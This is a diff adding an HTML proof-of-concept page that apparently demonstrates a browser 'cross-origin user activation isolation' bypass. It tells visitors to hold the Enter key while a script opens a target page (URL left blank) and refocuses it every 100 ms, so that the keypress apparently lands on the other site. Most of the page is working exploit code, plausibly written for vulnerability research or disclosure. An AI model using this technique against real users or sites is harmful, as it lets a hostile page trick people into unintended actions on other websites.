@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+
+<body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
+    <h1>Bypass of Cross-Origin User Activation Isolation</h1>
+
+    <div style="border: 2px dashed #ff4444; padding: 20px;">
+        <p>1. Click anywhere to focus this page.</p>
+        <p>2. <b>Press & HOLD the "Enter" key</b></p>
+        <p>3. Keep holding while the new page opens</p>
+    </div>
+
+    <script>
+        const targetURL = "";
+        let opened = false;
+
+        document.addEventListener("keydown", (event) => {
+            if (event.repeat || opened) return;
+
+            opened = true;
+            console.log("[*] Keydown detected. Opening target...");
+
+            const victim = window.open(targetURL, "_blank");
+
+            const focusInterval = setInterval(() => {
+                if (!victim || victim.closed) {
+                    clearInterval(focusInterval);
+                    return;
+                }
+
+                try {
+                    victim.focus();
+                } catch (e) { }
+            }, 100);
+        });
+    </script>
+</body>
+
+</html>
